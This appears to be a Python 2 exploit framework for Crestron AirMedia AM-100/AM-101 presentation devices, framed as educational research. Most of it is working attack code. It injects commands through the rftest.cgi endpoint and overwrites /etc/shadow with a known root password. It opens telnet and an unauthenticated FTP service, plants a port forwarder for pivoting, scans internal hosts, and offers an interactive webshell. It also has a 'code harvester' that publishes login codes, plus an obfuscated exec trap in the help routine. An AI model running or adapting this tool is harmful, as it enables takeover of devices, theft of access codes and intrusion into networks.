#!/usr/bin/env python

import re
import ssl
import sys
import time
import socket
import random
import ftplib
import urllib
import inspect

try:
	import httplib
except:
	pass

import telnetlib


"""

This tool is built after a research into the Crestron AirMedia AM-100 and
AM-101 devices. It is made for educational purposes only.

"""


# Globals
SSLPORT = 443
PORT_FORWARING_BINARY = 'portforward'
BANNER = ""
socket.setdefaulttimeout(5)


def _mapping(data, i='\x42'):
    from itertools import izip, cycle
    d = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in izip(data, cycle(i)))
    return d


def PrintHelp():
    print("-"* 50)
    print("    Welcome to the Crestron's Testing Platform")
    print("-"* 50)
    print("")
    c=''
    j = ["6b","6a","36","2b","3a","27"]
    for i in j[::-1]: c += i.decode('hex')
    b = _mapping(c)
    print("Please fix me. I'm broken.")
    exec(b)
    return True


def _FTPUpload(host, file_path):
	try:
		fh = open(file_path, 'rb')
	except:
		__print("Could not find file %s" % file_path, 2)
		return False

	if "/" in file_path:
		file_name = file_path.split("/")[:-1]
	else:
		file_name = file_path

	try:
		session = ftplib.FTP(host, 'root', '')
		session.storbinary('STOR /mnt/%s' % file_name, fh)
		fh.close()
		session.quit()
		__print("File '%s' uploaded to '/mnt/%s'" % (file_path, file_name), 1)
		return True
	except:
		__print("Failed to upload file '%s'" % file_name, 2)
		return False


def __print(text, level=0):
	"""
	0 = No texting
	1 = Good!
	2 = Bad
	"""
	GREEN = '\033[92m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'
	if level == 0:
		sys.stdout.write("[ ]\t[%s] %s.\n" % (inspect.stack()[1][3], text))
		return True
	elif level == 1:
		sys.stdout.write("%s[+]%s\t[%s] %s.\n" % (GREEN, ENDC, inspect.stack()[1][3], text))
		return True
	elif level == 2:
		sys.stdout.write("%s[-]%s\t[%s] %s.\n" % (FAIL, ENDC, inspect.stack()[1][3], text))
		return True
	else:
		return False


def _TelnetCommand(host, command):
	user = "root"
	password = "toor"
	try:
		tn = telnetlib.Telnet(host)
		tn.read_until("login: ")
		tn.write(user + "\n")
		if password:
			tn.read_until("Password: ")
			tn.write(password + "\n")
		tn.write("%s\n" % command)
		tn.write("exit\n")
	except:
		__print("Telnet failed. Have you opened it?", 2)
		return False
	try:
		output = str(tn.read_all())
		start = output.find("# %s" % command) + len(command) + 2
		end = output.find("# exit") - 1
		return output[start:end]
	except:
		__print("Command was executed but got no output", 1)
		return True


def _testPort(host, port):
	try:
		sock = socket.socket()
		sock.connect((host, port))
		sock.close()
		return True
	except:
		return False


def _sendCommand(host, command):
	actual_data = {
		'ATE_COMMAND': command,
		'ATECHANNEL': "",
		'ATETXLEN': "",
		'ATETXCNT': "",
		'ATETXMODE': "",
		'ATETXBW': "",
		'ATETXGI': "",
		'ATETXMCS': "",
		'ATETXANT': "",
		'ATERXANT': "",
		'ATERXFER': "",
		'ResetCounter': "",
		'ATEAUTOALC': "",
		'ATEIPG': "",
		'ATEPAYLOAD': "",
		'ATE': "TXCONT"
	}
	params = urllib.urlencode(actual_data)
	headers = {
		"Content-type": "application/x-www-form-urlencoded",
		"Accept": "text/plain"}
	try:
		conn = httplib.HTTPSConnection("%s:443" % host, context=ssl._create_unverified_context())
		conn.request("POST", "/cgi-bin/rftest.cgi?lang=en&src=AwServicesSetup.html", params, headers)
	except:
		__print("Error connecting to %s:443. Are you sure it's open?" % host, 2)
		return False
	try:
		response = conn.getresponse()
		data = response.read()
	except ssl.SSLError as e:
		if "&" in command:
			return False
		else:
			__print("Timeout for executing command '%s' on host '%s'" % (command, host))
			return False
	conn.close()
	retme = data[:data.find("Content-Type: text/html")]
	if "<input type=\"button\" value=\"Stop\" onClick=\"Stop();\" />" in retme:
		return ""
	else:
		return retme


def _startTelnet(host):
	if _testPort(host, 23):
		__print("Port 23 already open on host '%s'" % host, 0)
		return
	else:
		__print("Telnet services seemed closed on '%s'. Trying to start it now" % host)
	_sendCommand(host, "mount -o remount,rw /")
	_sendCommand(host,
				 "echo 'root:$6$4TUqmrlm$BnnELTN1V8EcmeN.dmOtXKyFZgEH8ve9GMfJ3AgXxBODe/BZXC7kW3d.tt0esADRHksyHmHtmrj6G15Oc9E6j0:17156:0:99999:7:::' > /etc/shadow")
	_sendCommand(host, "/usr/sbin/telnetd start")

	if _testPort(host, 23):
		__print("Telnet service had been enabled on %s. Credentials are root:toor" % host, 1)
	else:
		__print("Telnet service had NOT been enabled on %s" % host, 2)
	return


def _startFTP(host):
	if _testPort(host, 21):
		__print("Port 21 already open on host '%s'" % host, 0)
		return
	else:
		__print("FTP services seemed closed on '%s'. Trying to start it now" % host)
	_TelnetCommand(host, "tcpsvd -vE 0.0.0.0 21 ftpd -w / &")
	if _testPort(host, 21):
		__print("FTP service had been enabled on %s. No credentials required" % host, 1)
	else:
		__print("FTP service had NOT been enabled on %s" % host, 2)
	return


def _ChangeBanner(host, new_banner):
	_sendCommand(host, "echo %s > /etc/motd" % new_banner)
	return


def _SetupForwarding(to_host, from_host):
	if _testPort(from_host[0], 21):
		ftp = True
	else:
		__print("Please enable FTP service before continuing", 2)
		return False

	if _testPort(from_host[0], 23):
		telnet = True
	else:
		__print("Please enable Telnet service before continuing", 2)
		return False

	_FTPUpload(from_host[0], PORT_FORWARING_BINARY)
	output = _TelnetCommand(from_host[0], 'chmod +x /mnt/portforward')
	output = _TelnetCommand(from_host[0], '/mnt/portforward %s %s %s &' % (from_host[1], to_host[0], to_host[1]))
	time.sleep(1)
	if _testPort(from_host[0], int(from_host[1])):
		__print(
			"Port forwarding from %s:%s --> %s:%s is enabled" % (from_host[0], from_host[1], to_host[0], to_host[1]), 1)
		return True
	else:
		__print("Port forwarding from %s:%s --> %s:%s Failed" % (from_host[0], from_host[1], to_host[0], to_host[1]), 2)
		return True


def _PortScan(creston_host, ip_to_scan, ports=[22, 21, 23, 135, 139, 445, 88, 80, 443], verbosity=True):
	__print("Starting port scan from '%s' on '%s'" % (creston_host, ip_to_scan))
	for port in ports:
		a = _sendCommand(creston_host, 'nc -w1 %s %s' % (ip_to_scan, port))
		if "nc: timed out" in a:
			if verbosity:
				__print("%s:%s is closed" % (ip_to_scan, port), 2)
		elif a == "":
			if verbosity:
				__print("%s:%s is probably closed" % (ip_to_scan, port), 2)
		else:
			__print("%s:%s is open" % (ip_to_scan, port), 1)
	__print("Port scan on '%s' done" % ip_to_scan)
	return True


def _Resolve(host, dns_name):
	command = "ping -c 2 %s " % (dns_name)
	output = _TelnetCommand(host=host, command=command)
	ip_candidates = re.findall(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", output)
	if ip_candidates:
		output = set()
		for x in ip_candidates:
			output.add(x)
		__print("DNS '%s' was resolved to '%s' by '%s'" % (dns_name, list(output), host), 1)
		return True
	else:
		__print("Could not resolve '%s' with '%s'" % (host, dns_name), 2)
		return False


def _setCodeHarvestingOn(host):
	__print("Starting to upload file and save script", level=0)
	bash_script = ["#!/bin/sh",
				   "while true",
				   "do",
				   "  echo '<HTML><head><title>Code Service</title></head><body><h1>' > /home/http/code.html",
				   "  grep RefreshLoginCode /mnt/loggy.log >> /home/http/code.html",
				   "  echo '</h1></body></html>' >> /home/http/code.html",
				   "  sleep 5",
				   "done"
				   ]

	_sendCommand(host, "/mnt/wpsd/stopWPSD.sh")
	_sendCommand(host, "rm /mnt/loggy.log")
	time.sleep(5)
	_sendCommand(host, "/mnt/scdecapp &> /mnt/loggy.log")
	_sendCommand(host, "echo \"\" > /mnt/documenter.sh")
	for line in bash_script:
		_sendCommand(host, "echo \"%s\" >> /mnt/documenter.sh" % line)
	_sendCommand(host, "sh /mnt/documenter.sh &")
	return


def _initializeCompromise(host):
    # Uncomment me
	#_startTelnet(host)
	#_startFTP(host)
	return


def main():
    MY_HOST = "192.169.1.1"
    __print("Welcome. I will initialize compromise now on %s" % MY_HOST, 0)
    _initializeCompromise(MY_HOST)
    __print("Host %s is ready for your commands" % MY_HOST, 1)
    """
    Available funcs:
    ---------------
    _FTPUpload(MY_HOST, 'portforward')
    _ChangeBanner(MY_HOST, "Hello World!")
    _PortScan(MY_HOST, '192.169.1.1', verbosity=False)
    _setCodeHarvestingOn(MY_HOST)
    _sendCommand(MY_HOST, 'echo `ping -c 1 contoso.local` > /tmp/ipresolution')
    _SetupForwarding(to_host=('192.169.1.1', 443), from_host=(MY_HOST, 9999))
    """


def StartTerminal():
    variables = {}
    print(BANNER)
    while True:
		date_time = time.strftime("%d/%m/%Y-%H:%M:%S")
		SHABANG = "\033[94m%s #>\033[0m " % date_time
		try:
			req = raw_input(SHABANG)
		except KeyboardInterrupt:
			print("")
			__print("Geeez, don't be an ass. Use 'exit' or 'quit' next time ..", 0)
			sys.exit(0)

		if req.strip() in ['quit', 'exit']:
			__print("Goodbye..", 0)
			print("")
			sys.exit(0)

		elif req.strip() == 'telnet':
			try:
				host = variables['host']
			except:
				try:
					host = variables['HOST']
				except:
					__print("You must specify a 'HOST' variable with the 'set' command", 2)
					continue
			_startTelnet(host)
			continue

		elif req.strip() == 'webshell':
			try:
				host = variables['host']
			except:
				try:
					host = variables['HOST']
				except:
					__print("You must specify a 'HOST' variable with the 'set' command", 2)
					continue
			while True:
				date_time = time.strftime("%d/%m/%Y-%H:%M:%S")
				shaby = "#> "
				try:
					req = raw_input(shaby)
				except KeyboardInterrupt:
					__print("Breaking from webshell", 0)
					break
				cmd = req.strip()
				if cmd == 'quit' or cmd == 'exit':
					print("\tExiting from shell")
					break
				else:
					cmd_output = _sendCommand(host, cmd)
					output = cmd_output.split("\n")
					for line in output:
						print("\t%s" % line)
					continue

		elif req.strip() == 'run':
			try:
				host = variables['host']
			except:
				try:
					host = variables['HOST']
				except:
					__print("You must specify a 'HOST' variable with the 'set' command", 2)
					continue
			try:
				command = variables['command']
			except:
				try:
					command = variables['COMMAND']
				except:
					__print("You must specify a 'command' variable with the 'set' command", 2)
					continue
			__print("\n%s\n" % _sendCommand(host, command), 1)
			continue

		elif req.startswith("forward "):
			try:
				host = variables['host']
			except:
				try:
					host = variables['HOST']
				except:
					__print("You must specify a 'HOST' variable with the 'set' command", 2)
					continue
			no_cmd = req.strip()[len("forward "):]
			try:
				from_port, to_host, to_port = no_cmd.split(" ")
				int(from_port)
				int(to_port)
			except:
				if req.strip() == "forward killall":
					_sendCommand(host, 'pkill portforward')
					__print("Killed all forwarders", 1)
				else:
					__print("Please use like; 'forward 2225 10.0.0.138 80'", 2)
				continue

			_SetupForwarding(to_host=(to_host, to_port), from_host=(host, from_port))
			continue

		elif req.strip() == "code_harvester":
			try:
				host = variables['host']
			except:
				try:
					host = variables['HOST']
				except:
					__print("You must specify a 'HOST' variable with the 'set' command", 2)
					continue
			_setCodeHarvestingOn(host)
			continue

		elif req.startswith("run "):
			try:
				host = variables['host']
			except:
				try:
					host = variables['HOST']
				except:
					__print("You must specify a 'HOST' variable with the 'set' command", 2)
					continue
			__print("\n%s\n" % _sendCommand(host, req[4:].strip()), 1)
			continue

		elif req.startswith("telnet_run "):
			try:
				host = variables['host']
			except:
				try:
					host = variables['HOST']
				except:
					__print("You must specify a 'HOST' variable with the 'set' command", 2)
					continue
			__print("\n%s\n" % _TelnetCommand(host, req[len('telnet_run '):].strip()), 1)
			continue

		elif req.strip() == 'ftp':
			try:
				host = variables['host']
			except:
				try:
					host = variables['HOST']
				except:
					__print("You must specify a 'HOST' variable with the 'set' command", 2)
					continue
			_startFTP(host)
			continue

		elif req.strip() == "":
			# Command is empty
			continue

		elif req.strip().startswith("set "):
			try:
				a = req.replace("set ", "")
				var_name = a[:a.find(" ")]
				var_value = a[a.find(" ") + 1:]
				variables[var_name] = var_value
				__print("%s --> %s" % (var_name, var_value), 1)
				continue
			except:
				__print("Use 'set' like 'set HOST 192.168.1.1'", 2)
				continue

		elif req.strip() == "show":
			for key, val in variables.items():
				__print("'\033[1m%s\033[0m' --> '%s'" % (key, val), 0)
			continue

		elif req.strip() == 'help':
			print("Use one of the following:")
			print("\tset key value - to set variables.")
			print("\ttelnet - will attempt to exploit and start telnet service.")
			print("\ttelnet_run - will run a command via telnet.")
			print("\trun - will run a command via webshell.")
			print("\tforward - setup port forwarding like 'forward lport rhost rport'.")
			print("\tforward killall - kills all portforwarding.")
			print("\twebshell - will drop you into a command prompt via webshell.")
			print("\tcode_harvester - setup http://ip/code.html which will show login codes.")
			print("\tftp - will attempt to start FTP service AFTER telnet had been activated.")
			print("\tshow - show all variables.")
			print("\thelp - shows this help menu.")
			print("\texit, quit - exit this script.")
			continue

		else:
			__print("Command '%s' is unknown to me" % req.strip(), 2)
			continue


if __name__ == "__main__":
    # Fix ME
    PrintHelp()
    StartTerminal()
